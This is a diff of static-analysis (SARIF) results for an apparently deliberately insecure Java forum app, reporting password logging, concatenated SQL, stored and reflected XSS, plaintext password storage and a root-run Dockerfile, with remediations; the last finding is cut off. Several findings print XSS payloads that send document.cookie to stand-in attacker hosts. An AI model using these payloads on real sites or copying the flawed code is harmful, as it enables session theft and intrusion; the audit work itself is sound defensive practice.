+            "text": "The <code>JdbcTemplate</code> bean in <code>ForumApplication</code> wraps every <code>DataSource</code> with a <code>ProxyDataSourceBuilder</code> that calls <code>.logQueryBySlf4j(SLF4JLogLevel.DEBUG, …)</code>. This causes every SQL statement executed through the application to be written in full to SLF4J logs.\n\n<code>UserDAO.authenticate()</code> constructs its query by string concatenation:<pre>\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"</pre>Because no parameterized queries are used, the literal plaintext password is embedded in the SQL string. The logging proxy then records this complete string — including the password — to the application log on every authentication attempt.\n\nAny actor who can read the application log file (developers, ops personnel, log-aggregation systems, crash-dump recipients, SIEM/SOAR pipelines, etc.) can harvest every password ever submitted to the login form. This is true even for failed login attempts, where the submitted credential is also fully included in the query.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/ForumApplication.java</code><pre>19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@Bean\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public JdbcTemplate jdbcTemplate(DataSource dataSource) {\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DataSource loggingDataSource = ProxyDataSourceBuilder\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.create(dataSource)\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new JdbcTemplate(loggingDataSource);\n25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n26&nbsp;|&nbsp;\n27&nbsp;|&nbsp;}</pre><h3>Remediation</h3>1. <strong>Remove the logging proxy</strong> (or restrict it so it never logs authentication queries): Remove or narrow the <code>logQueryBySlf4j</code> call. If query logging is needed for debugging, use a parameterized-query-aware logger that redacts bind-parameter values rather than logging the full statement string.\n2. <strong>Use parameterized queries in <code>UserDAO</code></strong>: Switch to <code>jdbcTemplate.query(\"SELECT 1 FROM users WHERE username = ? AND password = ?\", ResultSet::next, username, password)</code>. Even if logging remains enabled, bind parameters are logged separately from the SQL template and can be omitted or masked.\n3. <strong>Hash passwords</strong>: Store and compare password hashes (e.g. bcrypt) instead of plaintext, so that even if the query is somehow logged, the logged value is useless to an attacker.\n\nApplying all three layers (no-credential logging, parameterized queries, and password hashing) provides defence in depth.",
+            "markdown": "The `JdbcTemplate` bean in `ForumApplication` wraps every `DataSource` with a `ProxyDataSourceBuilder` that calls `.logQueryBySlf4j(SLF4JLogLevel.DEBUG, …)`. This causes every SQL statement executed through the application to be written in full to SLF4J logs.\n\n`UserDAO.authenticate()` constructs its query by string concatenation:\n```java\n\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n```\nBecause no parameterized queries are used, the literal plaintext password is embedded in the SQL string. The logging proxy then records this complete string — including the password — to the application log on every authentication attempt.\n\nAny actor who can read the application log file (developers, ops personnel, log-aggregation systems, crash-dump recipients, SIEM/SOAR pipelines, etc.) can harvest every password ever submitted to the login form. This is true even for failed login attempts, where the submitted credential is also fully included in the query."
           },
           "locations": [
             {
@@ -270,23 +218,159 @@
             }
           ],
           "fingerprints": {
-            "fortify/instance-id": "0288CB43E538FE8BC3FAD41DC8203BB5"
+            "fortify/instance-id": "E1403836ED13390CD14F4B4BFFB060CF"
           },
           "properties": {
-            "impact": 3.5,
-            "likelihood": 4,
+            "impact": 4,
+            "likelihood": 3.5,
             "snippetStartLine": 18,
-            "summary": "SQL query logging proxy writes plaintext user passwords to application logs",
-            "remediationSummary": "Use parameterized queries in UserDAO so passwords are not embedded in loggable SQL strings, and remove/restrict the ProxyDataSource query logger.",
-            "remediation": "1. **Stop embedding credentials in SQL strings.** Migrate `UserDAO.authenticate()` to use parameterized queries (prepared statements via `JdbcTemplate.query(sql, args, rowMapper)` or named parameters). This ensures the password is never part of the loggable SQL text.\n\n2. **Remove the query-logging proxy, or restrict its scope.** The `ProxyDataSourceBuilder` with `logQueryBySlf4j` logs the full SQL text verbatim. If query-level tracing is needed for debugging, log only non-sensitive queries, or mask bind parameters. Many JDBC proxy libraries support parameter masking.\n\n3. **Reduce the default log level.** Do not ship `logging.level.com.example.insecureforum=DEBUG` in production configuration. Move it to a development-only profile (`application-dev.properties`).\n\n4. **Hash passwords at rest.** Even after fixing the SQL injection and logging issues, passwords in the `users` table should be stored as a strong one-way hash (e.g., bcrypt), so a compromised log or database does not expose cleartext secrets."
+            "summary": "Global SQL query logger logs plaintext user passwords to application logs",
+            "remediationSummary": "Remove or restrict the SQL query logging proxy in ForumApplication, and switch UserDAO to parameterized queries so passwords are never embedded in logged SQL strings.",
+            "remediation": "1. **Remove the logging proxy** (or restrict it so it never logs authentication queries): Remove or narrow the `logQueryBySlf4j` call. If query logging is needed for debugging, use a parameterized-query-aware logger that redacts bind-parameter values rather than logging the full statement string.\n2. **Use parameterized queries in `UserDAO`**: Switch to `jdbcTemplate.query(\"SELECT 1 FROM users WHERE username = ? AND password = ?\", ResultSet::next, username, password)`. Even if logging remains enabled, bind parameters are logged separately from the SQL template and can be omitted or masked.\n3. **Hash passwords**: Store and compare password hashes (e.g. bcrypt) instead of plaintext, so that even if the query is somehow logged, the logged value is useless to an attacker.\n\nApplying all three layers (no-credential logging, parameterized queries, and password hashing) provides defence in depth."
+          }
+        },
+        {
+          "ruleId": "cross-site-scripting",
+          "level": "error",
+          "message": {
+            "text": "The JSP EL expression <code>${msg.body}</code> at line 30 renders the full message body directly into the HTML response without any HTML encoding. JSP EL expressions do <strong>not</strong> automatically escape output; only <code>&lt;c:out value=\"...\"/&gt;</code> or <code>fn:escapeXml()</code> provide escaping.\n\nThe <code>body</code> field is user-supplied text submitted via the compose form and stored verbatim in the database (<code>MessageDAO.post</code> performs no sanitization). An attacker can compose a message whose body contains arbitrary HTML/JavaScript, e.g.:<pre>&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</pre>When any other authenticated user opens the message, the script executes in their browser session, enabling session hijacking, credential theft, or further attacks against the application. Because the payload is persisted in the database it affects every viewer, not just a single targeted victim.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/read.jsp</code><pre>25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/article&gt;\n26&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;article&gt;\n27&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"content\"&gt;\n30&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${msg.body}\n31&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n32&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n33&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n34&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/article&gt;\n35&nbsp;|&nbsp;&lt;/div&gt;</pre><h3>Remediation</h3>Replace the bare EL expression with JSTL's output-encoding tag:<pre>&lt;c:out value=\"${msg.body}\"/&gt;</pre>Or, if rich-text rendering is genuinely required, sanitize the body server-side with a well-tested HTML sanitiser (e.g. OWASP Java HTML Sanitizer) before placing it into the model, and document the policy clearly. Do not rely solely on client-side filtering.",
+            "markdown": "The JSP EL expression `${msg.body}` at line 30 renders the full message body directly into the HTML response without any HTML encoding. JSP EL expressions do **not** automatically escape output; only `<c:out value=\"...\"/>` or `fn:escapeXml()` provide escaping.\n\nThe `body` field is user-supplied text submitted via the compose form and stored verbatim in the database (`MessageDAO.post` performs no sanitization). An attacker can compose a message whose body contains arbitrary HTML/JavaScript, e.g.:\n\n```html\n<script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n```\n\nWhen any other authenticated user opens the message, the script executes in their browser session, enabling session hijacking, credential theft, or further attacks against the application. Because the payload is persisted in the database it affects every viewer, not just a single targeted victim."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/main/webapp/WEB-INF/views/messages/read.jsp"
+                },
+                "region": {
+                  "startLine": 30,
+                  "snippet": {
+                    "text": "                        </article>\n                        <article>\n                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        ${msg.body}\n                                    </div>\n                                </div>\n                            </div>\n                        </article>\n                    </div>"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "fortify/instance-id": "CFE4E750668A04EB465124ADB05C2FD8"
+          },
+          "properties": {
+            "impact": 4.5,
+            "likelihood": 4.5,
+            "snippetStartLine": 25,
+            "summary": "Stored XSS: message body rendered without HTML encoding in read.jsp",
+            "remediationSummary": "Replace ${msg.body} with &lt;c:out value=\"${msg.body}\"/&gt; to HTML-encode the untrusted content before rendering.",
+            "remediation": "Replace the bare EL expression with JSTL's output-encoding tag:\n\n```jsp\n<c:out value=\"${msg.body}\"/>\n```\n\nOr, if rich-text rendering is genuinely required, sanitize the body server-side with a well-tested HTML sanitiser (e.g. OWASP Java HTML Sanitizer) before placing it into the model, and document the policy clearly. Do not rely solely on client-side filtering."
+          }
+        },
+        {
+          "ruleId": "dockerfile-misconfiguration",
+          "level": "note",
+          "message": {
+            "text": "The Dockerfile contains no <code>USER</code> directive, so the application process (<code>java -jar …</code>) runs as the <code>root</code> user inside the container. If the Java process is compromised through any vulnerability (e.g. remote code execution via a deserialization flaw, path traversal, or SSRF), the attacker inherits full root privileges within the container. This makes container-escape attacks, writing arbitrary files to mounted volumes, and lateral movement significantly easier. No privilege-drop to a dedicated non-root service account ever occurs.<h3>Affected Code</h3><code>Dockerfile</code><pre>1&nbsp;|&nbsp;FROM openjdk:8-jre\n2&nbsp;|&nbsp;ENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]\n3&nbsp;|&nbsp;ADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war</pre><h3>Remediation</h3>Add a <code>USER</code> directive after the <code>ADD</code> step to drop to an unprivileged account before the entrypoint is invoked:<pre>FROM openjdk:8-jre\nADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nRUN groupadd -r appuser &amp;&amp; useradd -r -g appuser appuser \\\n&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; chown appuser:appuser /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nUSER appuser\nENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]</pre>This ensures the JVM process has only the minimum required permissions.",
+            "markdown": "The Dockerfile contains no `USER` directive, so the application process (`java -jar …`) runs as the `root` user inside the container. If the Java process is compromised through any vulnerability (e.g. remote code execution via a deserialization flaw, path traversal, or SSRF), the attacker inherits full root privileges within the container. This makes container-escape attacks, writing arbitrary files to mounted volumes, and lateral movement significantly easier. No privilege-drop to a dedicated non-root service account ever occurs."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile"
+                },
+                "region": {
+                  "startLine": 1,
+                  "snippet": {
+                    "text": "FROM openjdk:8-jre\nENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]\nADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war\n"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "fortify/instance-id": "661E4F6E613F1137ED5399F6DD303C21"
+          },
+          "properties": {
+            "impact": 2,
+            "likelihood": 2,
+            "snippetStartLine": 1,
+            "summary": "Dockerfile lacks a USER directive so the Java process runs as root (uid 0)",
+            "remediationSummary": "Add a non-root USER directive after ADD so the container process does not run as uid 0.",
+            "remediation": "Add a `USER` directive after the `ADD` step to drop to an unprivileged account before the entrypoint is invoked:\n\n```dockerfile\nFROM openjdk:8-jre\nADD target/insecureforum-0.0.1-SNAPSHOT.war /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nRUN groupadd -r appuser && useradd -r -g appuser appuser \\\n    && chown appuser:appuser /usr/share/insecureforum-0.0.1-SNAPSHOT.war\nUSER appuser\nENTRYPOINT [\"java\", \"-jar\", \"/usr/share/insecureforum-0.0.1-SNAPSHOT.war\"]\n```\n\nThis ensures the JVM process has only the minimum required permissions."
+          }
+        },
+        {
+          "ruleId": "password-management",
+          "level": "error",
+          "message": {
+            "text": "The schema defines <code>password VARCHAR(255)</code> with no indication of hashing, and the seed <code>INSERT</code> statements (lines 10-12) write plaintext passwords directly into the table. The <code>UserDAO.authenticate</code> method confirms the design: it compares the submitted password directly against the column value with <code>password = '...'</code>, meaning the database column always holds the raw secret.\\n\\nAny attacker who obtains read access to the database — via SQL injection elsewhere in the app, a backup leak, or direct DB access — immediately has every user's cleartext password, enabling credential stuffing against other services and complete account takeover with no offline cracking required.<h3>Affected Code</h3><code>src/main/resources/db/migration/V1__init.sql</code><pre>&nbsp;5&nbsp;|&nbsp;);\n&nbsp;6&nbsp;|&nbsp;\n&nbsp;7&nbsp;|&nbsp;INSERT INTO users\n&nbsp;8&nbsp;|&nbsp;&nbsp;&nbsp;(username, password)\n&nbsp;9&nbsp;|&nbsp;VALUES\n10&nbsp;|&nbsp;&nbsp;&nbsp;('****', '****'),\n11&nbsp;|&nbsp;&nbsp;&nbsp;('****', '****'),\n12&nbsp;|&nbsp;&nbsp;&nbsp;('****', '****');\n13&nbsp;|&nbsp;\n14&nbsp;|&nbsp;CREATE TABLE messages (\n15&nbsp;|&nbsp;&nbsp;&nbsp;id BIGINT AUTO_INCREMENT,</pre><h3>Remediation</h3>Replace plaintext storage with a strong adaptive password hash:\\n1. Change the column to hold a hash digest (still <code>VARCHAR(255)</code> is wide enough for bcrypt/Argon2 output).\\n2. At registration/password-change time, hash the password with <strong>bcrypt</strong> (cost ≥ 12), <strong>Argon2id</strong>, or <strong>scrypt</strong> using Spring Security's <code>PasswordEncoder</code> API (e.g. <code>BCryptPasswordEncoder</code>).\\n3. At login time, use <code>passwordEncoder.matches(submitted, storedHash)</code> instead of the raw SQL comparison.\\n4. Update the seed data to use pre-hashed values, or remove seed users from production migrations entirely.",
+            "markdown": "The schema defines `password VARCHAR(255)` with no indication of hashing, and the seed `INSERT` statements (lines 10-12) write plaintext passwords directly into the table. The `UserDAO.authenticate` method confirms the design: it compares the submitted password directly against the column value with `password = '...'`, meaning the database column always holds the raw secret.\\n\\nAny attacker who obtains read access to the database — via SQL injection elsewhere in the app, a backup leak, or direct DB access — immediately has every user's cleartext password, enabling credential stuffing against other services and complete account takeover with no offline cracking required."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/main/resources/db/migration/V1__init.sql"
+                },
+                "region": {
+                  "startLine": 10,
+                  "snippet": {
+                    "text": ");\n\nINSERT INTO users\n  (username, password)\nVALUES\n  ('****', '****'),\n  ('****', '****'),\n  ('****', '****');\n\nCREATE TABLE messages (\n  id BIGINT AUTO_INCREMENT,"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "fortify/instance-id": "75116853BA208F123BCABE61D460C5AA"
+          },
+          "properties": {
+            "impact": 4.5,
+            "likelihood": 3.5,
+            "snippetStartLine": 5,
+            "summary": "User passwords are stored as reversible plaintext strings in the users table.",
+            "remediationSummary": "Hash all passwords with bcrypt/Argon2id via Spring Security's PasswordEncoder before storing; never store or compare cleartext passwords.",
+            "remediation": "Replace plaintext storage with a strong adaptive password hash:\\n1. Change the column to hold a hash digest (still `VARCHAR(255)` is wide enough for bcrypt/Argon2 output).\\n2. At registration/password-change time, hash the password with **bcrypt** (cost ≥ 12), **Argon2id**, or **scrypt** using Spring Security's `PasswordEncoder` API (e.g. `BCryptPasswordEncoder`).\\n3. At login time, use `passwordEncoder.matches(submitted, storedHash)` instead of the raw SQL comparison.\\n4. Update the seed data to use pre-hashed values, or remove seed users from production migrations entirely."
+          }
+        },
+        {
+          "ruleId": "cross-site-scripting",
+          "level": "error",
+          "message": {
+            "text": "In the message list view, <code>${msg.subject}</code> (line 19) and <code>${msg.author}</code> (line 26) are rendered into the HTML response without HTML encoding. Both values originate from the database and are user-controlled. An attacker can inject HTML or JavaScript into either field when composing a message, e.g. placing a <code>&lt;script&gt;</code> tag in the subject so that every user who visits the messages list page is attacked, not only those who open the individual message. This makes the list page itself a persistent XSS attack surface affecting a wider audience than the read page.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/list.jsp</code><pre>14&nbsp;|&nbsp;&lt;div class=\"column is-9\"&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box content\"&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:forEach items=\"${messages}\" var=\"msg\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;article&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;a href=\"./read/${msg.id}\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h4&gt;${msg.subject}&lt;/h4&gt;\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-left\"&gt;\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i class=\"fab fa-readme\"&gt;&lt;/i&gt;\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;</pre><h3>Remediation</h3>Encode all user-controlled EL expressions with <code>&lt;c:out&gt;</code>:<pre>&lt;h4&gt;&lt;c:out value=\"${msg.subject}\"/&gt;&lt;/h4&gt;\n...\nby &lt;c:out value=\"${msg.author}\"/&gt; on &lt;c:out value=\"${msg.timestamp}\"/&gt;</pre>",
+            "markdown": "In the message list view, `${msg.subject}` (line 19) and `${msg.author}` (line 26) are rendered into the HTML response without HTML encoding. Both values originate from the database and are user-controlled. An attacker can inject HTML or JavaScript into either field when composing a message, e.g. placing a `<script>` tag in the subject so that every user who visits the messages list page is attacked, not only those who open the individual message. This makes the list page itself a persistent XSS attack surface affecting a wider audience than the read page."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/main/webapp/WEB-INF/views/messages/list.jsp"
+                },
+                "region": {
+                  "startLine": 19,
+                  "snippet": {
+                    "text": "                <div class=\"column is-9\">\n                    <div class=\"box content\">\n                        <c:forEach items=\"${messages}\" var=\"msg\">\n                                <article>\n                                    <a href=\"./read/${msg.id}\">\n                                        <h4>${msg.subject}</h4>\n                                        <div class=\"media\">\n                                            <div class=\"media-left\">\n                                                <i class=\"fab fa-readme\"></i>\n                                            </div>\n                                            <div class=\"media-content\">"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "fortify/instance-id": "7FB75AE1005C830DC71ECD90B75C4BC2"
+          },
+          "properties": {
+            "impact": 4,
+            "likelihood": 4,
+            "snippetStartLine": 14,
+            "summary": "Stored XSS: message subject and author rendered without HTML encoding in list.jsp",
+            "remediationSummary": "Replace ${msg.subject} and ${msg.author} with &lt;c:out&gt; tags to HTML-encode untrusted data in list.jsp.",
+            "remediation": "Encode all user-controlled EL expressions with `<c:out>`:\n\n```jsp\n<h4><c:out value=\"${msg.subject}\"/></h4>\n...\nby <c:out value=\"${msg.author}\"/> on <c:out value=\"${msg.timestamp}\"/>\n```"
           }
         },
         {
           "ruleId": "cross-site-scripting/reflected",
           "level": "error",
           "message": {
-            "text": "The EL expression <code>${prefillUsername}</code> is rendered directly into the HTML body inside a <code>&lt;p&gt;</code> element on line 14 without any HTML-encoding. The value is sourced from the <code>username</code> HTTP query parameter in <code>AuthenticationController.loginSubmit()</code>, which on authentication failure issues a redirect to <code>/auth/login?username=&lt;attacker_value&gt;</code>. The GET handler at <code>/auth/login</code> then binds that query parameter directly to the request attribute <code>prefillUsername</code> with no sanitisation:<pre>request.setAttribute(\"prefillUsername\", username);</pre>Because JSP EL (<code>${...}</code>) does <strong>not</strong> HTML-encode by default, an attacker can craft a URL such as:<pre>/auth/login?username=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</pre>and trick a victim into visiting it (e.g. via a phishing link). The script executes in the victim's browser under the forum's origin, allowing session-cookie theft, credential harvesting, or UI redressing.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/auth/login.jsp</code><pre>&nbsp;9&nbsp;|&nbsp;&lt;div class=\"column is-6 is-offset-3\"&gt;\n10&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:if test=\"${!authenticationFailed}\"&gt;\n11&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p class=\"subtitle has-text-grey\"&gt;Please login to access the forum&lt;/p&gt;\n12&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/c:if&gt;\n13&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:if test=\"${authenticationFailed}\"&gt;\n14&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p class=\"subtitle has-text-danger\"&gt;Authentication failed for user ${prefillUsername}, please retry&lt;/p&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/c:if&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"field\"&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"control has-icons-left\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input name=\"username\" class=\"input is-large\" type=\"text\"</pre><h3>Remediation</h3>Replace the raw EL expression with JSTL's <code>&lt;c:out&gt;</code>, which HTML-encodes by default:<pre>&lt;p class=\"subtitle has-text-danger\"&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;Authentication failed for user &lt;c:out value=\"${prefillUsername}\"/&gt;, please retry\n&lt;/p&gt;</pre>Alternatively use the JSTL functions tag library: <code>${fn:escapeXml(prefillUsername)}</code>. Also consider URL-encoding the username when building the redirect in <code>AuthenticationController</code> to avoid injecting special characters into the redirect URL itself.",
-            "markdown": "The EL expression `${prefillUsername}` is rendered directly into the HTML body inside a `<p>` element on line 14 without any HTML-encoding. The value is sourced from the `username` HTTP query parameter in `AuthenticationController.loginSubmit()`, which on authentication failure issues a redirect to `/auth/login?username=<attacker_value>`. The GET handler at `/auth/login` then binds that query parameter directly to the request attribute `prefillUsername` with no sanitisation:\n\n```java\nrequest.setAttribute(\"prefillUsername\", username);\n```\n\nBecause JSP EL (`${...}`) does **not** HTML-encode by default, an attacker can craft a URL such as:\n```\n/auth/login?username=<script>document.location='https://evil.com/?c='+document.cookie</script>\n```\nand trick a victim into visiting it (e.g. via a phishing link). The script executes in the victim's browser under the forum's origin, allowing session-cookie theft, credential harvesting, or UI redressing."
+            "text": "The JSP EL expression <code>${prefillUsername}</code> is interpolated directly into HTML text content on line 14 without any HTML encoding. The value is sourced from the <code>username</code> URL query parameter (<code>/auth/login?username=...</code>) — fully attacker-controlled — and placed into the page by <code>AuthenticationController.login()</code> via <code>request.setAttribute(\"prefillUsername\", username)</code> with no sanitization.\\n\\nAn attacker can craft a URL such as:\\n``<code>\\n/auth/login?username=&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;\\n</code>`<code>\\nWhen the victim follows this link, the browser executes the injected script in the context of the forum's origin, enabling session cookie theft, phishing overlays, credential harvesting, and more.\\n\\nJSP EL expressions (</code>${}<code>) do <strong>not</strong> HTML-encode their output by default; JSTL's </code>&lt;c:out&gt;` or explicit encoding is required.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/auth/login.jsp</code><pre>&nbsp;9&nbsp;|&nbsp;&lt;div class=\"column is-6 is-offset-3\"&gt;\n10&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:if test=\"${!authenticationFailed}\"&gt;\n11&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p class=\"subtitle has-text-grey\"&gt;Please login to access the forum&lt;/p&gt;\n12&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/c:if&gt;\n13&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:if test=\"${authenticationFailed}\"&gt;\n14&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;p class=\"subtitle has-text-danger\"&gt;Authentication failed for user ${prefillUsername}, please retry&lt;/p&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/c:if&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div 